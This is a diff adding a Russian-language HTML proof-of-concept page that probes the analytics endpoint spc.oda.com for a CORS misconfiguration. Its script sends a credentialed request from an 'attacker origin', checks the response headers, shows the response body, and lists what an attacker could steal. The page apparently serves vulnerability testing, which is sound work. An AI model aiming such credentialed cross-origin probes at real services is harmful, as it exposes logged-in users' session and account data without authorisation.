@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Test for Oda.com</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f7fa;
+            color: #333;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #e53935;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 25px;
+        }
+        .test-button {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        .test-button:hover {
+            background: #0d47a1;
+        }
+        .test-button:disabled {
+            background: #90a4ae;
+            cursor: not-allowed;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 6px;
+            background: #f8f9fa;
+            white-space: pre-wrap;
+            font-family: monospace;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .vulnerable {
+            background: #ffebee;
+            border-left: 4px solid #f44336;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        .safe {
+            background: #e8f5e9;
+            border-left: 4px solid #4caf50;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        .warning {
+            background: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 6px 6px 0;
+        }
+        .status {
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 CORS Test for spc.oda.com</h1>
+        <p class="subtitle">Этот тест проверяет уязвимость CORS на сервере Snowplow. Нажмите кнопку для выполнения теста.</p>
+        
+        <button id="testButton" class="test-button">Запустить тест CORS</button>
+        <div class="loader" id="loader"></div>
+        
+        <div class="status" id="status"></div>
+        <div class="result" id="result"></div>
+        
+        <div class="warning">
+            <strong>⚠️ Важно:</strong> Этот тест работает только если вы авторизованы в oda.com в том же браузере. Для корректного тестирования откройте oda.com в новой вкладке, войдите в аккаунт, затем вернитесь на эту страницу и запустите тест.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('testButton').addEventListener('click', runCorsTest);
+
+        async function runCorsTest() {
+            const button = document.getElementById('testButton');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+            const result = document.getElementById('result');
+            
+            // Очищаем предыдущие результаты
+            status.innerHTML = '';
+            result.innerHTML = '';
+            result.className = 'result';
+            
+            // Блокируем кнопку и показываем загрузку
+            button.disabled = true;
+            loader.style.display = 'block';
+            status.innerHTML = 'Тестирование CORS...';
+            
+            try {
+                const targetUrl = 'https://spc.oda.com/com.snowplowanalytics.snowplow/tp2';
+                const attackerOrigin = 'https://github.com'; // GitHub Pages origin
+                
+                const response = await fetch(targetUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Origin': attackerOrigin
+                    },
+                    body: JSON.stringify({
+                        "schema": "iglu:com.snowplowanalytics.snowplow/payload_data/jsonschema/1-0-4",
+                        "data": [{
+                            "url": "https://oda.com/no/account/",
+                            "referrer": "https://oda.com/no/account/",
+                            "uid": "test_uid_for_cors_test",
+                            "sid": "test_sid_for_cors_test"
+                        }]
+                    }),
+                    credentials: 'include'
+                });
+                
+                // Собираем заголовки ответа
+                const headers = {};
+                response.headers.forEach((value, name) => {
+                    headers[name.toLowerCase()] = value;
+                });
+                
+                // Определяем уязвимость
+                const acAo = headers['access-control-allow-origin'] || '';
+                const acAc = headers['access-control-allow-credentials'] || '';
+                
+                let isVulnerable = false;
+                let vulnLevel = '';
+                
+                if ((acAo === attackerOrigin || acAo === '*') && acAc === 'true') {
+                    isVulnerable = true;
+                    vulnLevel = 'CRITICAL';
+                } else if (acAo === attackerOrigin || acAo === '*') {
+                    isVulnerable = true;
+                    vulnLevel = 'HIGH';
+                }
+                
+                // Формируем результат
+                const resultData = {
+                    status: response.status,
+                    statusText: response.statusText,
+                    headers: headers,
+                    vulnerable: isVulnerable,
+                    vulnLevel: vulnLevel,
+                    body: response.headers.get('content-type')?.includes('json') 
+                        ? await response.json() 
+                        : await response.text()
+                };
+                
+                // Отображаем результат
+                result.innerHTML = `
+Статус ответа: ${resultData.status} ${resultData.statusText}
+
+Заголовки ответа:
+${Object.entries(resultData.headers).map(([name, value]) => 
+  `${name}: ${value}`
+).join('\n')}
+
+Тело ответа:
+${JSON.stringify(resultData.body, null, 2)}
+                `;
+                
+                if (isVulnerable) {
+                    result.className = 'result vulnerable';
+                    status.innerHTML = `🚨 УЯЗВИМОСТЬ CORS ОБНАРУЖЕНА! Уровень: ${vulnLevel}`;
+                    
+                    // Добавляем детали уязвимости
+                    result.innerHTML += `\n\n\n=== ДЕТАЛИ УЯЗВИМОСТИ ===\n
+Этот сервер уязвим к CORS атакам. Злоумышленник может:
+- Украсть данные вашей сессии
+- Получить доступ к истории заказов
+- Увидеть платежные методы
+- Выполнить действия от вашего имени
+
+Технические детали:
+- Access-Control-Allow-Origin: ${acAo}
+- Access-Control-Allow-Credentials: ${acAc}
+- Сервер доверяет Origin: ${attackerOrigin}
+                    `;
+                } else {
+                    result.className = 'result safe';
+                    status.innerHTML = '✅ CORS настроен правильно. Уязвимостей не обнаружено.';
+                }
+                
+            } catch (error) {
+                status.innerHTML = `❌ Ошибка при тестировании: ${error.message}`;
+                result.innerHTML = `Детали ошибки:\n${error.stack || error.toString()}`;
+                result.className = 'result warning';
+            } finally {
+                // Разблокируем кнопку и скроем загрузку
+                button.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
